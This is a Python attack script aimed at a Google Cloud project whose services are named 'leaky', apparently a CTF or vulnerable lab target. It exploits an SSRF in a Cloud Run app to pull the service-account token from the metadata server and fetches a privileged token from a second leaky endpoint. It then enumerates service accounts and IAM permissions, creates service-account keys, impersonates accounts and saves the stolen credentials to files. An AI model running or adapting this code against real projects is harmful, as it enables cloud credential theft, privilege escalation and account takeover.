import requests
import os 
import requests
import json
from bs4 import BeautifulSoup

def get_access_token():
    # Define URL and data for the POST request
    url = "https://leaky-bucket-jobztbckaq-uc.a.run.app/result"
    data = {
        "inputUrl": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "inputHeader": '{"Metadata-Flavor": "Google"}'
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36"
    }

    response = requests.post(url, data=data, headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")
    
    # Find the table cell with the token data
    token_data_cell = soup.find("td")
    if token_data_cell:
        # Parse the token JSON string and retrieve the 'access_token' field
        token_data = json.loads(token_data_cell.text.replace("&#34;", '"'))
        return token_data["access_token"]
    else:
        raise Exception("Unable to fetch token from the server's response.")

def get_privileged_access_token():
    # Define URL for the GET request
    url = "https://leaky-access-jobztbckaq-uc.a.run.app/result"
   
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36"
    }

    response = requests.post(url, data={}, headers=headers)

    soup = BeautifulSoup(response.content, "html.parser")
    
    # Find the table cell (td) with the token data
    token_data_cell = soup.find("td")
    if token_data_cell:
        # Parse the token JSON string and retrieve the 'access_token' field
        token_data = json.loads(token_data_cell.text.replace("&#34;", '"'))
        return token_data["access_token"]
    else:
        raise Exception("Unable to fetch token from the server's response.")


def list_service_accounts(project_id, access_token):
    """
    List all service accounts for a given project ID.

    Args:
        project_id (str): The ID of the Google Cloud project.
        access_token (str): The access token for authentication.

    Returns:
        list: A list of service accounts.
    """
    
    endpoint = f"https://iam.googleapis.com/v1/projects/{project_id}/serviceAccounts"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json"
    }

    response = requests.get(endpoint, headers=headers)
    
    if response.status_code != 200:
        print("Error fetching service accounts:", response.json())
        return []
    
    service_accounts = response.json().get('accounts', [])
    
    return [sa['email'] for sa in service_accounts]

def create_service_account_key(project_id, service_account_name, access_token):
    endpoint = f"https://iam.googleapis.com/v1/projects/{project_id}/serviceAccounts/{service_account_name}/keys"
    print(endpoint)
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    body = {
        "keyAlgorithm": "KEY_ALG_UNSPECIFIED",
        "privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE"
    }
    response = requests.post(endpoint, headers=headers, json=body)
    if response.status_code == 200:
        return response.json()
    else:
        print("Failed to create service account key.")
        print(response.json())
        return None


def impersonate_service_account(original_token, target_service_account_email, delegates=[]):
    GOOGLE_IMPERSONATE_URL = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{target_service_account_email}:generateAccessToken"
    
    headers = {
        "Authorization": f"Bearer {original_token}"
    }
    
    data = {
        "lifetime": "3600s",  # Duration for which the impersonated token is valid
        "scope": ["https://www.googleapis.com/auth/cloud-platform"],  # The OAuth2 scopes for the generated token
        "delegates": delegates
    }

    print(data)
    
    response = requests.post(GOOGLE_IMPERSONATE_URL, headers=headers, json=data)

    if response.status_code != 200:
        print("Error impersonating service account:", response.json())
        return None

    return response.json()['accessToken']


def list_service_account_permissions(service_accounts, access_token):
    base_url = "https://iam.googleapis.com/v1"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json"
    }
    
    permissions_by_account = {}
    
    for sa_email in service_accounts:
        resource = f"projects/-/serviceAccounts/{sa_email}"
        policy_url = f"{base_url}/{resource}:getIamPolicy"
        response = requests.post(policy_url, headers=headers)
        
        if response.status_code != 200:
            print(f"Failed to get IAM policy for {sa_email}. HTTP Status: {response.status_code}")
            print(response.json())
            continue

        policy = response.json()
        roles = {binding['role'] for binding in policy.get('bindings', [])}
        
        permissions = set()
        for role in roles:
            role_info_url = f"{base_url}/{role}"
            role_response = requests.get(role_info_url, headers=headers)
            
            if role_response.status_code != 200:
                print(f"Failed to get role information for {role}. HTTP Status: {role_response.status_code}")
                continue
                
            role_info = role_response.json()
            role_permissions = role_info.get('includedPermissions', [])
            permissions.update(role_permissions)
        
        permissions_by_account[sa_email] = permissions

    return permissions_by_account

def write_credential(sa_name, sa_content):
    with open("./accounts/" + sa_name + ".json", 'wb') as file:
        file.write(bytes(str(sa_content), "UTF-8"))
        file.close()

def format_delegates(service_accounts):
    return [f"projects/-/serviceAccounts/{sa}" for sa in service_accounts]


# Variables
project_id = 'optimal-jigsaw-390814'
access_token = get_privileged_access_token()

service_accounts = [
    'leakybucket@optimal-jigsaw-390814.iam.gserviceaccount.com',
    'leakysecret@optimal-jigsaw-390814.iam.gserviceaccount.com',
    '134663715059-compute@developer.gserviceaccount.com',
    'leakyaccess@optimal-jigsaw-390814.iam.gserviceaccount.com',
    'docker-pusher@optimal-jigsaw-390814.iam.gserviceaccount.com',
    'optimal-jigsaw-390814@appspot.gserviceaccount.com'
]


for sa_name in service_accounts:
    #print("Creating key for " + sa_name)
    #print(create_service_account_key(project_id, sa_name, access_token))
    print(list_service_account_permissions([sa_name], access_token))

formatted_delegates = format_delegates(service_accounts)

#print(list_service_account_permissions(service_accounts, access_token))

#for d in formatted_delegates:
    #impersonated_token = impersonate_service_account(get_access_token(), 'leakysecret@optimal-jigsaw-390814.iam.gserviceaccount.com', delegates=d)
    #print(impersonated_token)

#print(list_service_accounts(project_id, access_token))

#service_account_name = 'leakysecret@optimal-jigsaw-390814.iam.gserviceaccount.com'

#for sa_name in service_accounts:
#    print("Creating key for " + sa_name)
#    write_credential(sa_name, create_service_account_key(sa_name))